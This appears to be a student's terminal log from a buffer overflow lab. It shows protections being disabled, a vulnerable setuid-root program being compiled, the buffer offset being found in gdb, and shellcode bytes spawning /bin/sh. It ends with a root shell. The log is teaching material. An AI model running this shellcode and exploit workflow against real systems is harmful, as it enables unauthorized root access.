[06/16/22]seed@VM:~/.../b1_16$ sudo sysctl -w kernel.randomize_va_space=0
kernel.randomize_va_space = 0
[06/16/22]seed@VM:~/.../b1_16$ sudo ln -sf /bin/zsh /bin/sh
[06/16/22]seed@VM:~/.../b1_16$ sudo su
root@VM:/home/seed/practice/b1_16# gcc -m32 -o A1 -z execstack -fno-stack-protector A1.c
root@VM:/home/seed/practice/b1_16# sudo chown root A1
root@VM:/home/seed/practice/b1_16# sudo chmod 4755 A1
root@VM:/home/seed/practice/b1_16# su seed
[06/16/22]seed@VM:~/.../b1_16$ 
[06/16/22]seed@VM:~/.../b1_16$ touch badfile
[06/16/22]seed@VM:~/.../b1_16$ gcc  -m32 -o A1_dbg -g -z execstack -fno-stack-protector A1.c
[06/16/22]seed@VM:~/.../b1_16$ gdb A1_dbg
GNU gdb (Ubuntu 9.2-0ubuntu1~20.04) 9.2
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
/opt/gdbpeda/lib/shellcode.py:24: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if sys.version_info.major is 3:
/opt/gdbpeda/lib/shellcode.py:379: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if pyversion is 3:
Reading symbols from A1_dbg...
gdb-peda$ b foo
Breakpoint 1 at 0x12a5: file A1.c, line 24.
gdb-peda$ run
Starting program: /home/seed/practice/b1_16/A1_dbg 
Normal Execution
[----------------------------------registers-----------------------------------]
EAX: 0xffffd201 --> 0x90909090 
EBX: 0x56558fc8 --> 0x3ed0 
ECX: 0x0 
EDX: 0x3fb 
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0xffffd608 --> 0x0 
ESP: 0xffffd1ec --> 0x5655638e (<main+122>:	add    esp,0x10)
EIP: 0x565562a5 (<foo>:	endbr32)
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x565562a0 <bof+83>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x565562a3 <bof+86>:	leave  
   0x565562a4 <bof+87>:	ret    
=> 0x565562a5 <foo>:	endbr32 
   0x565562a9 <foo+4>:	push   ebp
   0x565562aa <foo+5>:	mov    ebp,esp
   0x565562ac <foo+7>:	sub    esp,0x1000
   0x565562b2 <foo+13>:	or     DWORD PTR [esp],0x0
[------------------------------------stack-------------------------------------]
0000| 0xffffd1ec --> 0x5655638e (<main+122>:	add    esp,0x10)
0004| 0xffffd1f0 --> 0xffffd201 --> 0x90909090 
0008| 0xffffd1f4 --> 0x1 
0012| 0xffffd1f8 --> 0x3fb 
0016| 0xffffd1fc --> 0x5655a5b0 --> 0xfbad2488 
0020| 0xffffd200 --> 0x9090900c 
0024| 0xffffd204 --> 0x90909090 
0028| 0xffffd208 --> 0x90909090 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, foo (str=0xffffd201 '\220' <repeats 200 times>...) at A1.c:24
24	{
gdb-peda$ b bof
Breakpoint 2 at 0x5655624d: file A1.c, line 10.
gdb-peda$ continue
Continuing.
[----------------------------------registers-----------------------------------]
EAX: 0x56558fc8 --> 0x3ed0 
EBX: 0x56558fc8 --> 0x3ed0 
ECX: 0x0 
EDX: 0x3fb 
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0xffffd1e8 --> 0xffffd608 --> 0x0 
ESP: 0xffffb77c --> 0x565562db (<foo+54>:	add    esp,0x10)
EIP: 0x5655624d (<bof>:	endbr32)
EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56556244 <frame_dummy+4>:	jmp    0x565561a0 <register_tm_clones>
   0x56556249 <__x86.get_pc_thunk.dx>:	mov    edx,DWORD PTR [esp]
   0x5655624c <__x86.get_pc_thunk.dx+3>:	ret    
=> 0x5655624d <bof>:	endbr32 
   0x56556251 <bof+4>:	push   ebp
   0x56556252 <bof+5>:	mov    ebp,esp
   0x56556254 <bof+7>:	push   ebx
   0x56556255 <bof+8>:	sub    esp,0x2a4
[------------------------------------stack-------------------------------------]
0000| 0xffffb77c --> 0x565562db (<foo+54>:	add    esp,0x10)
0004| 0xffffb780 --> 0xffffd201 --> 0x90909090 
0008| 0xffffb784 --> 0x0 
0012| 0xffffb788 --> 0x0 
0016| 0xffffb78c --> 0x565562c1 (<foo+28>:	add    eax,0x2d07)
0020| 0xffffb790 --> 0x0 
0024| 0xffffb794 --> 0x0 
0028| 0xffffb798 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 2, bof (str=0xffffd201 '\220' <repeats 200 times>...) at A1.c:10
10	{
gdb-peda$ next
[----------------------------------registers-----------------------------------]
EAX: 0x56558fc8 --> 0x3ed0 
EBX: 0x56558fc8 --> 0x3ed0 
ECX: 0x0 
EDX: 0x3fb 
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0xffffb778 --> 0xffffd1e8 --> 0xffffd608 --> 0x0 
ESP: 0xffffb4d0 --> 0x0 
EIP: 0x56556266 (<bof+25>:	mov    DWORD PTR [ebp-0x1c],0x7)
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56556255 <bof+8>:	sub    esp,0x2a4
   0x5655625b <bof+14>:	call   0x56556150 <__x86.get_pc_thunk.bx>
   0x56556260 <bof+19>:	add    ebx,0x2d68
=> 0x56556266 <bof+25>:	mov    DWORD PTR [ebp-0x1c],0x7
   0x5655626d <bof+32>:	sub    esp,0x8
   0x56556270 <bof+35>:	push   DWORD PTR [ebp+0x8]
   0x56556273 <bof+38>:	lea    eax,[ebp-0x29b]
   0x56556279 <bof+44>:	push   eax
[------------------------------------stack-------------------------------------]
0000| 0xffffb4d0 --> 0x0 
0004| 0xffffb4d4 --> 0x0 
0008| 0xffffb4d8 --> 0x0 
0012| 0xffffb4dc --> 0x0 
0016| 0xffffb4e0 --> 0x0 
0020| 0xffffb4e4 --> 0x0 
0024| 0xffffb4e8 --> 0x0 
0028| 0xffffb4ec --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
12	    arr[5] = 7;
gdb-peda$ next
[----------------------------------registers-----------------------------------]
EAX: 0x56558fc8 --> 0x3ed0 
EBX: 0x56558fc8 --> 0x3ed0 
ECX: 0x0 
EDX: 0x3fb 
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0xffffb778 --> 0xffffd1e8 --> 0xffffd608 --> 0x0 
ESP: 0xffffb4d0 --> 0x0 
EIP: 0x5655626d (<bof+32>:	sub    esp,0x8)
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x5655625b <bof+14>:	call   0x56556150 <__x86.get_pc_thunk.bx>
   0x56556260 <bof+19>:	add    ebx,0x2d68
   0x56556266 <bof+25>:	mov    DWORD PTR [ebp-0x1c],0x7
=> 0x5655626d <bof+32>:	sub    esp,0x8
   0x56556270 <bof+35>:	push   DWORD PTR [ebp+0x8]
   0x56556273 <bof+38>:	lea    eax,[ebp-0x29b]
   0x56556279 <bof+44>:	push   eax
   0x5655627a <bof+45>:	call   0x565560d0 <strcpy@plt>
[------------------------------------stack-------------------------------------]
0000| 0xffffb4d0 --> 0x0 
0004| 0xffffb4d4 --> 0x0 
0008| 0xffffb4d8 --> 0x0 
0012| 0xffffb4dc --> 0x0 
0016| 0xffffb4e0 --> 0x0 
0020| 0xffffb4e4 --> 0x0 
0024| 0xffffb4e8 --> 0x0 
0028| 0xffffb4ec --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
17			strcpy(buffer, str);
gdb-peda$ p $ebp
$1 = (void *) 0xffffb778
gdb-peda$ p &buffer
$2 = (char (*)[619]) 0xffffb4dd
gdb-peda$ p/d 0xffffb778 - 0xffffb4dd
$3 = 667
gdb-peda$ disas secret
Dump of assembler code for function secret:
   0x565562e5 <+0>:	endbr32 
   0x565562e9 <+4>:	push   ebp
   0x565562ea <+5>:	mov    ebp,esp
   0x565562ec <+7>:	push   ebx
   0x565562ed <+8>:	sub    esp,0x4
   0x565562f0 <+11>:	call   0x565563b2 <__x86.get_pc_thunk.ax>
   0x565562f5 <+16>:	add    eax,0x2cd3
   0x565562fa <+21>:	sub    esp,0xc
   0x565562fd <+24>:	lea    edx,[eax-0x1fbd]
   0x56556303 <+30>:	push   edx
   0x56556304 <+31>:	mov    ebx,eax
   0x56556306 <+33>:	call   0x565560e0 <puts@plt>
   0x5655630b <+38>:	add    esp,0x10
   0x5655630e <+41>:	nop
   0x5655630f <+42>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x56556312 <+45>:	leave  
   0x56556313 <+46>:	ret    
End of assembler dump.
gdb-peda$ q
[06/16/22]seed@VM:~/.../b1_16$ nasm -f elf32 mysh.s -o mysh.o
[06/16/22]seed@VM:~/.../b1_16$ xxd -p -c 20 mysh.o
7f454c4601010100000000000000000001000300
0100000000000000000000004000000000000000
3400000000002800050002000000000000000000
0000000000000000000000000000000000000000
0000000000000000000000000000000000000000
0000000001000000010000000600000000000000
1001000022000000000000000000000010000000
0000000007000000030000000000000000000000
4001000021000000000000000000000001000000
0000000011000000020000000000000000000000
7001000040000000040000000300000004000000
1000000019000000030000000000000000000000
b00100000f000000000000000000000001000000
000000000000000000000000bbe5625556ffd331
c050682f2f7368682f62696e89e3505389e131d2
31c0b00bcd800000000000000000000000000000
002e74657874002e7368737472746162002e7379
6d746162002e7374727461620000000000000000
0000000000000000000000000000000000000000
000000000100000000000000000000000400f1ff
0000000000000000000000000300010008000000
000000000000000010000100006d7973682e7300
5f73746172740000
[06/16/22]seed@VM:~/.../b1_16$ python3 convert.py 
Length of the shellcode: 34
shellcode= (
   "\xbb\xe5\x62\x55\x56\xff\xd3\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68"
   "\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b"
   "\xcd\x80"
).encode('latin-1')
[06/16/22]seed@VM:~/.../b1_16$ python3 exploit.py 
[06/16/22]seed@VM:~/.../b1_16$ ./A1
Normal Execution
�����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������ٷ��������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������bUV��1�Ph//shh/bin��PS��1�1��
                                                       ��UVp���Inside a Secret function
# WHO AMI                                                     zsh: command not found: WHAMI
# Wwhoami                                                    
zsh: command not found: Wwhoami
# whoami                                                     
root
